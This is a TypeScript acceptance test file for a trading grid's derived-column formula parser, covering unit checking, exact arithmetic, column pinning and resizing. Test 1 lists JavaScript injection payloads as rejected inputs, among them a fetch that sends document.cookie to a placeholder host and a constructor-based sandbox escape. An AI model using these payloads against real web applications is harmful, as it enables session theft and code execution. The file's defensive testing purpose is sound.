// P11-06 acceptance tests.
//
// Test 1 is the card: a dozen real code-execution payloads, every one of them
// refused by the GRAMMAR rather than by a blocklist. Run against `new
// Function` alongside, so what the eval implementation would have done is
// visible rather than described.
//
// Test 2: `pnl + qty` is rupees plus lots and is refused; `pnl / qty` is a
// real unit and comes out labelled.
//
// Test 3: the extent falls out of the arithmetic -- extensive over extensive
// is intensive -- so a derived column knows it cannot be summed.
//
// Test 4: evaluation stays exact, and a divide by zero is absent rather than
// Infinity.
//
// Test 5: a column is in exactly one region, and pinning cannot leave it in
// two.
//
// Test 6: a column cannot be resized to a width from which it cannot return.

import { test } from 'node:test';
import assert from 'node:assert/strict';

import { RowStore } from '../src/grid/store.ts';
import { ColumnType } from '../src/grid/filter.ts';
import { Agg, Extent, aggregate, allowedAggregations } from '../src/grid/aggregate.ts';
import type { AggColumnSpec } from '../src/grid/aggregate.ts';
import { MIN_COLUMN_PX, MAX_COLUMN_PX } from '../src/layout.ts';
import {
  ExprProblem,
  MONEY,
  checkDims,
  dimEqual,
  dimLabel,
  evalExpr,
  parseExpr,
} from '../src/grid/expr.ts';
import {
  Pin,
  flatten,
  pinOf,
  reorderWithin,
  resize,
  resolveGroups,
  setPin,
} from '../src/grid/columns.ts';
import type { ColumnOrder } from '../src/grid/columns.ts';

const COLS: AggColumnSpec[] = [
  { key: 'pnl', label: 'P&L', type: ColumnType.Money, extent: Extent.Extensive },
  { key: 'qty', label: 'Qty', type: ColumnType.Integer, extent: Extent.Extensive },
  { key: 'price', label: 'Price', type: ColumnType.Money, extent: Extent.Intensive },
  { key: 'iv', label: 'IV', type: ColumnType.Real, extent: Extent.Intensive },
  { key: 'symbol', label: 'Symbol', type: ColumnType.Text, extent: Extent.Categorical },
];

test('[1] a derived column is untrusted code, and the grammar is the wall', () => {
  const payloads = [
    'fetch("https://x/?c="+document.cookie)',
    'constructor.constructor("return 1")()',
    'globalThis.process.exit(1)',
    'this.window.location',
    'pnl.constructor',
    'pnl["toString"]',
    'row[0]',
    'import("fs")',
    '`${pnl}`',
    'pnl; alert(1)',
    'a=1',
    'pnl => pnl',
  ];

  let executed = 0;
  for (const p of payloads) {
    // What the one-line implementation would do. Only PARSED here, never run
    // -- the point is that eval accepts these as programs at all.
    let evalWouldAccept = false;
    try {
      // eslint-disable-next-line no-new-func
      new Function('row', `return ${p}`);
      evalWouldAccept = true;
    } catch {
      evalWouldAccept = false;
    }
    if (evalWouldAccept) executed++;

    const r = parseExpr(p);
    assert.equal(r.ok, false, `refused: ${p}`);
  }

  console.log(
    `    ${payloads.length} payloads: \`new Function\` compiles ${executed} of them into runnable programs; this parser accepts 0`,
  );
  assert.ok(
    executed >= 10,
    'the eval implementation would have compiled almost all of these -- and a derived column travels in the saved layout and in the URL, so "the user would only attack themselves" is not the threat model. A link is',
  );

  // Refused at the CHARACTER level, before any name is examined.
  assert.equal(
    parseExpr('pnl.qty').ok ? '' : (parseExpr('pnl.qty') as { problem: string }).problem,
    ExprProblem.IllegalCharacter,
    'a dot is not in the grammar, so member access stops at the tokeniser rather than at a blocklist someone has to keep current',
  );

  // And the legitimate cases still work.
  for (const good of ['pnl / qty', '(pnl - price * qty) / qty', '-pnl', 'pnl * 2', 'price / 100']) {
    assert.equal(parseExpr(good).ok, true, `accepted: ${good}`);
  }
});

test('[2] rupees plus lots is refused; rupees per lot is labelled', () => {
  const bad = parseExpr('pnl + qty');
  assert.equal(bad.ok, true, 'it parses -- it is syntactically fine');
  if (!bad.ok) return;
  const badDims = checkDims(bad.node, COLS);
  assert.equal(badDims.ok, false);
  if (!badDims.ok) {
    assert.equal(
      badDims.problem,
      ExprProblem.DimensionMismatch,
      'and is then refused on dimensions: nothing about "pnl + qty" is out of range, and a grid that evaluated it would print a plausible figure in a column the user named "edge"',
    );
  }

  const perLot = parseExpr('pnl / qty');
  assert.equal(perLot.ok, true);
  if (!perLot.ok) return;
  const d = checkDims(perLot.node, COLS);
  assert.equal(d.ok, true);
  if (!d.ok) return;
  console.log(`    pnl / qty has unit ${dimLabel(d.dim)}`);
  assert.equal(dimLabel(d.dim), '₹/lot', 'a real unit, and one the formatter labels rather than pretending is rupees');

  const squared = parseExpr('pnl * price');
  assert.equal(squared.ok, true);
  if (!squared.ok) return;
  const sd = checkDims(squared.node, COLS);
  assert.equal(sd.ok, true);
  if (sd.ok) {
    console.log(`    pnl * price has unit ${dimLabel(sd.dim)}`);
    assert.equal(dimLabel(sd.dim), '₹^2', 'rupees squared -- allowed to exist, but never mistaken for money');
    assert.equal(dimEqual(sd.dim, MONEY), false);
  }

  const text = parseExpr('symbol * 2');
  assert.equal(text.ok, true);
  if (text.ok) {
    const td = checkDims(text.node, COLS);
    assert.equal(td.ok, false);
    if (!td.ok) assert.equal(td.problem, ExprProblem.NotNumeric);
  }

  const unknown = parseExpr('nonesuch + 1');
  if (unknown.ok) {
    const ud = checkDims(unknown.node, COLS);
    assert.equal(ud.ok, false);
    if (!ud.ok) assert.equal(ud.problem, ExprProblem.UnknownColumn);
  }
});

test('[3] the extent falls out of the arithmetic', () => {
  const cases: ReadonlyArray<readonly [string, Extent, string]> = [
    ['pnl + pnl', Extent.Extensive, 'two extensive quantities added stay extensive'],
    ['pnl * 2', Extent.Extensive, 'an extensive quantity times a scalar stays extensive'],
    [
      'pnl / qty',
      Extent.Intensive,
      'but an extensive quantity DIVIDED by an extensive one is intensive -- which is exactly why an average price cannot be summed down a column, and the grid learns it from the formula rather than from someone remembering',
    ],
  ];
  for (const [src, expected, why] of cases) {
    const p = parseExpr(src);
    assert.equal(p.ok, true);
    if (!p.ok) continue;
    const d = checkDims(p.node, COLS);
    assert.equal(d.ok, true);
    if (!d.ok) continue;
    assert.equal(d.extent, expected, `${src}: ${why}`);
  }

  // And that answer feeds straight back into P11-05's menu.
  const derived: AggColumnSpec = {
    key: 'per_lot',
    label: 'P&L / lot',
    type: ColumnType.Money,
    extent: Extent.Intensive,
  };
  assert.equal(
    allowedAggregations(derived).includes(Agg.Sum),
    false,
    'so the derived column does not offer Sum, without anyone having declared that',
  );
});

test('[4] evaluation is exact, and a divide by zero is absent', () => {
  const store = new RowStore(COLS.map((c) => c.key));
  store.upsert(1, { pnl: 100000n, qty: 3, price: 25000n, iv: 0.18, symbol: 'A' });
  store.upsert(2, { pnl: 100000n, qty: 0, price: 25000n, iv: 0.2, symbol: 'B' });
  store.upsert(3, { qty: 5, price: 25000n, iv: 0.2, symbol: 'C' }); // no pnl

  const p = parseExpr('pnl / qty');
  assert.equal(p.ok, true);
  if (!p.ok) return;

  const r1 = evalExpr(p.node, store, 1);
  assert.notEqual(r1, null);
  console.log(
    `    100000 paise over 3 lots = ${r1?.num}/${r1?.den} exactly, not ${Number(100000n / 3n)} truncated`,
  );
  assert.deepEqual(
    r1,
    { num: 100000n, den: 3n },
    'the remainder is KEPT -- bigint division at each step would truncate 33333.33 to 33333 and then keep truncating in any further arithmetic',
  );

  assert.equal(
    evalExpr(p.node, store, 2),
    null,
    'a divide by zero is absent, not Infinity: an Infinity in a rupee column formats to something that looks like a very good day',
  );
  assert.equal(
    evalExpr(p.node, store, 3),
    null,
    'and a missing input gives no value rather than treating the blank as zero',
  );

  // Exact decimals in the formula itself.
  const dec = parseExpr('price * 1.5');
  assert.equal(dec.ok, true);
  if (dec.ok) {
    assert.deepEqual(
      evalExpr(dec.node, store, 1),
      { num: 37500n, den: 1n },
      '1.5 is carried as 15/10, never as the double 1.5, so the arithmetic stays exact end to end',
    );
  }

  // The derived column is a real column and reconciles like one.
  const total = aggregate(store, [...store.view], COLS[0]!, Agg.Sum);
  assert.equal(total.ok, true);
  if (total.ok) assert.equal(total.value.exact, 200000n);
});

test('[5] a column is in exactly one region', () => {
  let order: ColumnOrder = {
    pinnedLeft: [],
    scrolling: ['symbol', 'qty', 'price', 'pnl', 'iv'],
    pinnedRight: [],
  };

  order = setPin(order, 'symbol', Pin.Left);
  order = setPin(order, 'pnl', Pin.Right);
  assert.deepEqual(order.pinnedLeft, ['symbol']);
  assert.deepEqual(order.pinnedRight, ['pnl']);
  assert.deepEqual(order.scrolling, ['qty', 'price', 'iv']);
  assert.equal(
    flatten(order).length,
    5,
    'every column appears exactly once across the three regions',
  );
  assert.equal(new Set(flatten(order)).size, 5, 'and none appears twice');

  // Re-pin something already pinned. Removal from the old region is part of
  // the same operation, so there is no window where it is in both.
  order = setPin(order, 'symbol', Pin.Right);
  assert.equal(pinOf(order, 'symbol'), Pin.Right);
  assert.equal(order.pinnedLeft.includes('symbol'), false);
  assert.equal(new Set(flatten(order)).size, 5);

  // A reorder stays inside its own region -- a drag into the frozen area is a
  // pin, and collapsing the two is how a column ends up frozen and scrolling
  // at once.
  order = setPin(order, 'symbol', Pin.Left);
  const before = [...order.scrolling];
  order = reorderWithin(order, 'iv', 0);
  assert.deepEqual(order.scrolling[0], 'iv');
  assert.equal(order.scrolling.length, before.length);
  assert.equal(pinOf(order, 'symbol'), Pin.Left, 'and does not disturb the pins');

  assert.equal(pinOf(order, 'nonesuch'), Pin.Unspecified);

  // A group split across regions is reported rather than drawn wrong.
  const groups = [{ key: 'g', label: 'Greeks', members: ['iv', 'pnl'] }];
  const resolved = resolveGroups(order, groups);
  console.log(
    `    a group with one member pinned resolves to ${resolved.length} header(s), split=${resolved[0]?.split}`,
  );
  assert.equal(resolved.length, 2);
  assert.equal(
    resolved.every((g) => g.split),
    true,
    'a header spanning two regions cannot be drawn, so the split is reported and the header is rendered once per region -- which is what a user who pinned one member actually meant',
  );
});

test('[6] a column cannot be resized to a width it cannot come back from', () => {
  assert.equal(
    resize(0),
    MIN_COLUMN_PX,
    'dragging past zero clamps: a zero-width column has no resize handle, so it cannot be dragged back, and the layout persists that state forever',
  );
  assert.equal(resize(-500), MIN_COLUMN_PX);
  assert.equal(resize(1e9), MAX_COLUMN_PX);
  assert.equal(resize(Number.NaN), MIN_COLUMN_PX);
  assert.equal(resize(137.4), 137, 'and an ordinary drag is passed through, rounded to a whole pixel');
  assert.ok(
    resize(0) >= MIN_COLUMN_PX,
    'clamping rather than refusing keeps the drag feeling continuous while making the unrecoverable state unreachable',
  );
});
